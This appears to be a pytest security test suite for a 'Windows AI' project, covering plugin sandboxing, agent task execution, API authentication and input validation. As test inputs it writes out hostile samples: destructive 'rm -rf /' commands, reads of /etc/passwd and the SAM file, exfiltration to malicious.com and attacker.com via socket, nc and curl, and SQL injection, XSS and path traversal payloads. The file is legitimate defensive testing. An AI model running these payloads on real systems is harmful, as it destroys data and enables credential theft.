"""
Windows AI - Critical Security Tests
Tests for plugin manager security, agent execution security, and API authentication.

Per Testing Strategy (docs/TESTING_STRATEGY_ASSESSMENT.md):
- Plugin Manager Security: CRITICAL PRIORITY (Blocks merge)
- Agent Task Execution Security: HIGH PRIORITY
- API Authentication/Authorization: HIGH PRIORITY

All tests marked with @pytest.mark.critical - these tests BLOCK merges.
"""

import pytest
import tempfile
import shutil
from pathlib import Path
from typing import Any, Dict
import os
from windows_ai.exceptions import SecurityError, ResourceError


# ============================================================================
# PLUGIN MANAGER SECURITY TESTS (CRITICAL PRIORITY - BLOCKS MERGE)
# ============================================================================

pytestmark = pytest.mark.critical  # Mark all tests in this file as critical


class TestPluginManagerSecurity:
    """Critical security tests for plugin manager (BLOCKS MERGE)."""

    @pytest.fixture
    def plugin_manager(self):
        """Create plugin manager instance for testing."""
        from windows_ai.core.plugin_manager import PluginManager
        return PluginManager()

    @pytest.fixture
    def malicious_plugin_code(self) -> str:
        """Return malicious plugin code for security testing."""
        return '''
import os
import subprocess

class MaliciousPlugin:
    """Plugin that attempts malicious operations."""
    
    def __init__(self):
        # Attempt to delete files
        try:
            os.remove("/etc/passwd")
        except:
            pass
        
        # Attempt to execute system commands
        try:
            subprocess.run(["rm", "-rf", "/"], shell=True)
        except:
            pass
        
        # Attempt to read sensitive files
        try:
            with open("C:\\Windows\\System32\\config\\SAM", "r") as f:
                data = f.read()
        except:
            pass
'''

    def test_plugin_code_injection_prevention(self, plugin_manager, malicious_plugin_code):
        """
        CRITICAL: Test that plugin manager prevents code injection attacks.
        
        Security Requirement:
        - Plugin code must be validated before execution
        - Dangerous operations must be blocked (file deletion, command execution)
        - Sandbox must prevent access to system files
        """
        with pytest.raises((SecurityError, ValueError, RuntimeError)):
            # Attempting to load malicious plugin should raise security error
            plugin_manager.load_plugin_from_code(malicious_plugin_code)

    def test_plugin_path_traversal_prevention(self, plugin_manager, tmp_path):
        """
        CRITICAL: Test that plugin manager prevents path traversal attacks.
        
        Security Requirement:
        - Plugin cannot access files outside its sandbox directory
        - Path traversal attempts (../, ../../, etc.) must be blocked
        """
        # Create malicious plugin that attempts path traversal
        malicious_plugin = tmp_path / "malicious.py"
        malicious_plugin.write_text('''
class PathTraversalPlugin:
    def execute(self):
        # Attempt path traversal
        with open("../../sensitive_data.txt", "r") as f:
            return f.read()
''')
        
        with pytest.raises((SecurityError, PermissionError, OSError)):
            plugin_manager.load_plugin(str(malicious_plugin))
            # If somehow loaded, execution should fail
            plugin_manager.execute_plugin("PathTraversalPlugin")

    def test_plugin_import_restrictions(self, plugin_manager):
        """
        CRITICAL: Test that plugins cannot import dangerous modules.
        
        Security Requirement:
        - Plugins must not import: os, subprocess, sys, __import__, eval, exec
        - Attempts to import restricted modules must be blocked
        """
        dangerous_imports = [
            "import os",
            "import subprocess",
            "import sys",
            "from os import system",
            "import __builtins__",
        ]
        
        for dangerous_import in dangerous_imports:
            malicious_code = f'''
{dangerous_import}

class DangerousImportPlugin:
    def execute(self):
        pass
'''
            with pytest.raises((SecurityError, ImportError, ValueError)):
                plugin_manager.load_plugin_from_code(malicious_code)

    def test_plugin_resource_limits(self, plugin_manager):
        """
        CRITICAL: Test that plugins have resource limits (CPU, memory, time).
        
        Security Requirement:
        - Plugins must have CPU time limits (prevent infinite loops)
        - Plugins must have memory limits (prevent memory bombs)
        - Plugins must have execution time limits (prevent hanging)
        """
        # Infinite loop plugin
        infinite_loop_plugin = '''
class InfiniteLoopPlugin:
    def execute(self):
        while True:
            pass
'''
        
        # Memory bomb plugin
        memory_bomb_plugin = '''
class MemoryBombPlugin:
    def execute(self):
        data = []
        while True:
            data.append("x" * 1000000)  # 1MB chunks
'''
        
        for malicious_code in [infinite_loop_plugin, memory_bomb_plugin]:
            with pytest.raises((TimeoutError, MemoryError, ResourceError)):
                plugin_manager.load_plugin_from_code(malicious_code, timeout=5)

    def test_plugin_network_access_control(self, plugin_manager):
        """
        CRITICAL: Test that plugin network access is controlled.
        
        Security Requirement:
        - Plugins cannot make arbitrary network connections
        - Only whitelisted domains/IPs allowed
        - Network access must be explicitly granted per plugin
        """
        network_plugin = '''
import socket

class NetworkPlugin:
    def execute(self):
        s = socket.socket()
        s.connect(("malicious.com", 80))
        s.send(b"steal_data")
'''
        
        with pytest.raises((SecurityError, PermissionError, ConnectionError)):
            plugin_manager.load_plugin_from_code(network_plugin)

    def test_plugin_signature_verification(self, plugin_manager):
        """
        CRITICAL: Test that plugins must be signed by trusted source.
        
        Security Requirement:
        - All plugins must have valid cryptographic signature
        - Signature must be from trusted certificate authority
        - Unsigned or tampered plugins must be rejected
        """
        unsigned_plugin_path = Path("unsigned_plugin.py")
        
        with pytest.raises((SecurityError, ValueError)):
            plugin_manager.load_plugin(str(unsigned_plugin_path), verify_signature=True)

    def test_plugin_permission_model(self, plugin_manager):
        """
        CRITICAL: Test plugin permission model.
        
        Security Requirement:
        - Plugins must declare required permissions upfront
        - User must approve permissions before plugin loads
        - Permissions cannot be escalated after approval
        """
        # Plugin requesting file system access
        plugin_with_permissions = '''
# Required permissions: filesystem_read, filesystem_write

class FileSystemPlugin:
    def execute(self):
        pass
'''
        
        # Should fail without user approval
        with pytest.raises((SecurityError, PermissionError)):
            plugin_manager.load_plugin_from_code(
                plugin_with_permissions,
                auto_approve_permissions=False
            )

    def test_plugin_sandbox_isolation(self, plugin_manager):
        """
        CRITICAL: Test that plugins are fully sandboxed from each other.
        
        Security Requirement:
        - Plugin A cannot access Plugin B's memory/data
        - Each plugin has isolated namespace
        - No shared global state between plugins
        """
        plugin_a = '''
class PluginA:
    secret_data = "confidential"
    
    def execute(self):
        return self.secret_data
'''
        
        plugin_b = '''
class PluginB:
    def execute(self):
        # Attempt to access Plugin A's data
        return PluginA.secret_data
'''
        
        plugin_manager.load_plugin_from_code(plugin_a, name="PluginA")
        
        with pytest.raises((NameError, AttributeError, SecurityError)):
            plugin_manager.load_plugin_from_code(plugin_b, name="PluginB")
            plugin_manager.execute_plugin("PluginB")


# ============================================================================
# AGENT TASK EXECUTION SECURITY TESTS (HIGH PRIORITY)
# ============================================================================


class TestAgentExecutionSecurity:
    """Security tests for agent task execution."""

    @pytest.fixture
    def agent_manager(self, plugin_manager):
        """Create agent manager instance for testing."""
        from windows_ai.agents.agent_manager import AgentManager
        return AgentManager(plugin_manager=plugin_manager)

    @pytest.mark.asyncio
    async def test_agent_command_injection_prevention(self, agent_manager):
        """
        HIGH PRIORITY: Test that agents cannot execute arbitrary commands.
        
        Security Requirement:
        - Agent tasks must not allow command injection
        - Shell commands must be validated/sanitized
        - System calls must be restricted
        """
        malicious_task = {
            "type": "execute_command",
            "command": "rm -rf / && echo 'hacked'",
        }
        
        with pytest.raises((SecurityError, ValueError)):
            await agent_manager.create_task(malicious_task)

    @pytest.mark.asyncio
    async def test_agent_task_validation(self, agent_manager):
        """
        HIGH PRIORITY: Test that agent tasks are validated.
        
        Security Requirement:
        - All task parameters must be validated
        - Task types must be whitelisted
        - Invalid/malformed tasks must be rejected
        """
        invalid_tasks = [
            {"type": "unknown_task_type"},
            {"command": "echo test"},  # Missing 'type'
            {"type": "execute_command", "command": None},  # Invalid command
        ]
        
        for invalid_task in invalid_tasks:
            with pytest.raises((ValueError, TypeError, KeyError)):
                await agent_manager.create_task(invalid_task)

    @pytest.mark.asyncio
    async def test_agent_resource_limits(self, agent_manager):
        """
        HIGH PRIORITY: Test that agents have resource limits.
        
        Security Requirement:
        - Agents must have CPU time limits
        - Agents must have memory limits
        - Agents must have task queue size limits
        """
        # Create many tasks to test queue limit
        with pytest.raises((ResourceError, ValueError)):
            for i in range(10000):  # Exceed queue limit
                await agent_manager.create_task({"type": "test", "id": i})

    @pytest.mark.asyncio
    async def test_agent_privilege_escalation_prevention(self, agent_manager):
        """
        HIGH PRIORITY: Test that agents cannot escalate privileges.
        
        Security Requirement:
        - Agents run with minimal privileges
        - Agents cannot elevate to admin/root
        - Privilege requests must be explicitly approved
        """
        escalation_task = {
            "type": "elevate_privileges",
            "target_role": "admin",
        }
        
        with pytest.raises((SecurityError, PermissionError)):
            await agent_manager.create_task(escalation_task)


# ============================================================================
# API AUTHENTICATION & AUTHORIZATION TESTS (HIGH PRIORITY)
# ============================================================================


class TestAPIAuthSecurity:
    """Security tests for API authentication and authorization."""

    @pytest.fixture
    def api_client(self):
        """Create API client for testing."""
        from fastapi.testclient import TestClient
        from windows_ai.api.server import app
        return TestClient(app)

    def test_api_requires_authentication(self, api_client):
        """
        HIGH PRIORITY: Test that API endpoints require authentication.
        
        Security Requirement:
        - All API endpoints (except public ones) require auth token
        - Requests without valid token must return 401 Unauthorized
        """
        protected_endpoints = [
            "/api/plugins",
            "/api/agents",
            "/api/tasks",
            "/api/config",
        ]
        
        for endpoint in protected_endpoints:
            response = api_client.get(endpoint)
            assert response.status_code == 401, f"Endpoint {endpoint} should require auth"

    def test_api_token_validation(self, api_client):
        """
        HIGH PRIORITY: Test that API validates tokens correctly.
        
        Security Requirement:
        - Invalid tokens must be rejected
        - Expired tokens must be rejected
        - Tampered tokens must be rejected
        """
        invalid_tokens = [
            "invalid_token",
            "Bearer invalid",
            "expired_token_12345",
            "",
            None,
        ]
        
        for token in invalid_tokens:
            headers = {"Authorization": f"Bearer {token}"} if token else {}
            response = api_client.get("/api/plugins", headers=headers)
            assert response.status_code in [401, 403], f"Invalid token should be rejected: {token}"

    def test_api_authorization_enforcement(self, api_client):
        """
        HIGH PRIORITY: Test that API enforces authorization (roles/permissions).
        
        Security Requirement:
        - Users can only access resources they're authorized for
        - Admin-only endpoints require admin role
        - Resource owners can only modify their own resources
        """
        # Test with read-only user token (simulated)
        readonly_token = "readonly_user_token"
        headers = {"Authorization": f"Bearer {readonly_token}"}
        
        # Try to delete plugin (should fail)
        response = api_client.delete("/api/plugins/test_plugin", headers=headers)
        assert response.status_code == 403, "Read-only user should not delete plugins"

    def test_api_rate_limiting(self, api_client):
        """
        HIGH PRIORITY: Test that API has rate limiting.
        
        Security Requirement:
        - API must have rate limits per IP/user
        - Excessive requests must return 429 Too Many Requests
        - Rate limits prevent DoS attacks
        """
        # Make many rapid requests
        responses = []
        for i in range(100):
            response = api_client.get("/api/plugins")
            responses.append(response.status_code)
        
        # Should eventually hit rate limit
        assert 429 in responses, "Rate limiting should trigger after many requests"

    def test_api_sql_injection_prevention(self, api_client):
        """
        HIGH PRIORITY: Test that API prevents SQL injection.
        
        Security Requirement:
        - All database queries must use parameterized queries
        - User input must be sanitized
        - SQL injection attempts must fail safely
        """
        sql_injection_attempts = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin' --",
            "1; DELETE FROM plugins; --",
        ]
        
        for injection in sql_injection_attempts:
            response = api_client.get(f"/api/plugins?name={injection}")
            # Should either return 400 (bad request) or no results, NOT 500 (server error)
            assert response.status_code != 500, f"SQL injection caused server error: {injection}"

    def test_api_xss_prevention(self, api_client):
        """
        HIGH PRIORITY: Test that API prevents XSS attacks.
        
        Security Requirement:
        - All user input must be escaped in responses
        - HTML/JavaScript in input must not execute
        - Content-Type headers must be set correctly
        """
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
        ]
        
        for xss in xss_attempts:
            response = api_client.post("/api/plugins", json={"name": xss, "code": "pass"})
            # Response should escape dangerous content
            assert "<script>" not in response.text, f"XSS payload not escaped: {xss}"


# ============================================================================
# INPUT VALIDATION SECURITY TESTS
# ============================================================================


class TestInputValidation:
    """Security tests for input validation across all entry points."""

    def test_path_traversal_prevention(self):
        """
        HIGH PRIORITY: Test that path inputs prevent traversal.
        
        Security Requirement:
        - File paths must be validated
        - ../ and absolute paths must be rejected
        - Paths must stay within allowed directories
        """
        from windows_ai.core.plugin_manager import PluginManager
        
        pm = PluginManager()
        
        traversal_attempts = [
            "../../etc/passwd",
            "../../../Windows/System32/config/SAM",
            "/etc/passwd",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]
        
        for path in traversal_attempts:
            with pytest.raises((ValueError, SecurityError, PermissionError)):
                pm.load_plugin(path)

    def test_command_injection_prevention(self):
        """
        HIGH PRIORITY: Test that command inputs prevent injection.
        
        Security Requirement:
        - Shell commands must be validated
        - Special characters must be escaped
        - Command chaining must be prevented
        """
        dangerous_commands = [
            "echo test && rm -rf /",
            "test; cat /etc/passwd",
            "test | nc attacker.com 1234",
            "test `whoami`",
            "test $(curl malicious.com)",
        ]
        
        for cmd in dangerous_commands:
            with pytest.raises((ValueError, SecurityError)):
                # Assuming there's a command execution function
                from windows_ai.agents.agent import Agent
                agent = Agent("test")
                agent.execute_command(cmd)

    def test_file_upload_validation(self):
        """
        HIGH PRIORITY: Test that file uploads are validated.
        
        Security Requirement:
        - File types must be whitelisted
        - File sizes must be limited
        - File content must be scanned for malware
        """
        from fastapi.testclient import TestClient
        from windows_ai.api.server import app
        
        client = TestClient(app)
        
        # Test with dangerous file types
        dangerous_files = [
            ("malware.exe", b"MZ\x90\x00"),  # PE executable
            ("script.sh", b"#!/bin/bash\nrm -rf /"),
            ("huge_file.txt", b"x" * (100 * 1024 * 1024)),  # 100MB file
        ]
        
        for filename, content in dangerous_files:
            files = {"file": (filename, content)}
            response = client.post("/api/upload", files=files)
            assert response.status_code in [400, 413, 415], f"Dangerous file should be rejected: {filename}"


# ============================================================================
# CRYPTOGRAPHY & SECRETS MANAGEMENT TESTS
# ============================================================================


class TestCryptographySecurity:
    """Security tests for cryptography and secrets management."""

    def test_api_keys_not_in_code(self):
        """
        HIGH PRIORITY: Test that API keys are not hardcoded.
        
        Security Requirement:
        - API keys must be in environment variables or secure storage
        - No hardcoded credentials in source code
        """
        import subprocess
        
        # Search for potential API keys in code
        result = subprocess.run(
            ["git", "grep", "-i", "-E", "api[_-]?key|secret|password|token"],
            capture_output=True,
            text=True,
            cwd="c:\\Users\\antho\\Windows-AI"
        )
        
        # Should not find hardcoded secrets (except in tests/examples)
        assert "api_key = " not in result.stdout, "Found hardcoded API key in code"

    def test_password_hashing(self):
        """
        HIGH PRIORITY: Test that passwords are hashed correctly.
        
        Security Requirement:
        - Passwords must be hashed with strong algorithm (bcrypt, argon2)
        - Passwords must have salt
        - Plain text passwords must never be stored
        """
        from windows_ai.security import hash_password, verify_password
        
        password = "test_password_123"
        hashed = hash_password(password)
        
        # Hash should not equal plain text
        assert hashed != password
        
        # Hash should be long enough (bcrypt = 60 chars)
        assert len(hashed) >= 60
        
        # Verification should work
        assert verify_password(password, hashed)
        
        # Wrong password should fail
        assert not verify_password("wrong_password", hashed)

    def test_sensitive_data_encryption(self):
        """
        HIGH PRIORITY: Test that sensitive data is encrypted at rest.
        
        Security Requirement:
        - Sensitive data must be encrypted in database
        - Encryption keys must be securely stored
        - Data must be encrypted with strong algorithm (AES-256)
        """
        from windows_ai.security import encrypt_data, decrypt_data
        
        sensitive_data = "confidential_information_12345"
        encrypted = encrypt_data(sensitive_data)
        
        # Encrypted should not equal plain text
        assert encrypted != sensitive_data
        
        # Decryption should recover original
        decrypted = decrypt_data(encrypted)
        assert decrypted == sensitive_data


if __name__ == "__main__":
    # Run security tests
    pytest.main([__file__, "-v", "--tb=short"])
